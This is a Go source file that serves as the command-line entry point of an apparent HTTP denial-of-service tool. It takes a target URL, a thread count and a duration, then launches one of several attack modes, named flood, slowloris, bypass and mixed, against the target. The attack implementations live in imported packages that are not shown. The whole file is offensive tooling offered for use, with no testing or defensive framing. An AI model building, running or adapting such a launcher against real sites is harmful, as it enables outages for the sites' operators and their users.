// cmd/ddos/main.go
package main

import (
    "flag"
    "fmt"
    "os"
    "os/signal"
    "syscall"
    "time"

    "github.com/stresstest/layer7-flood/pkg/attacker"
    "github.com/stresstest/layer7-flood/pkg/config"
    "github.com/stresstest/layer7-flood/pkg/stats"
)

func main() {
    configPath := flag.String("config", "configs/default.yaml", "Configuration file path")
    target := flag.String("target", "", "Target URL (overrides config)")
    threads := flag.Int("threads", 0, "Number of threads (overrides config)")
    duration := flag.Int("duration", 0, "Duration in seconds (overrides config)")
    attackType := flag.String("attack", "flood", "Attack type: flood, slowloris, bypass, mixed")
    flag.Parse()

    cfg, err := config.Load(*configPath)
    if err != nil {
        fmt.Printf("Failed to load config: %v\n", err)
        os.Exit(1)
    }

    if *target != "" {
        cfg.Target.URL = *target
    }
    if *threads > 0 {
        cfg.Attack.Threads = *threads
    }
    if *duration > 0 {
        cfg.Attack.Duration = *duration
    }

    statsCollector := stats.NewCollector()
    
    var atk attacker.Attacker
    switch *attackType {
    case "slowloris":
        atk = attacker.NewSlowloris(cfg, statsCollector)
    case "bypass":
        atk = attacker.NewBypass(cfg, statsCollector)
    case "mixed":
        atk = attacker.NewMixed(cfg, statsCollector)
    default:
        atk = attacker.NewFlood(cfg, statsCollector)
    }

    sigChan := make(chan os.Signal, 1)
    signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

    fmt.Printf("\n[+] Starting %s attack on %s\n", *attackType, cfg.Target.URL)
    fmt.Printf("[+] Threads: %d, Duration: %ds\n", cfg.Attack.Threads, cfg.Attack.Duration)
    
    go statsCollector.Start()

    go atk.Start()

    select {
    case <-time.After(time.Duration(cfg.Attack.Duration) * time.Second):
        fmt.Println("\n[+] Attack completed")
    case <-sigChan:
        fmt.Println("\n[+] Interrupted")
    }

    atk.Stop()
    statsCollector.PrintFinal()
}
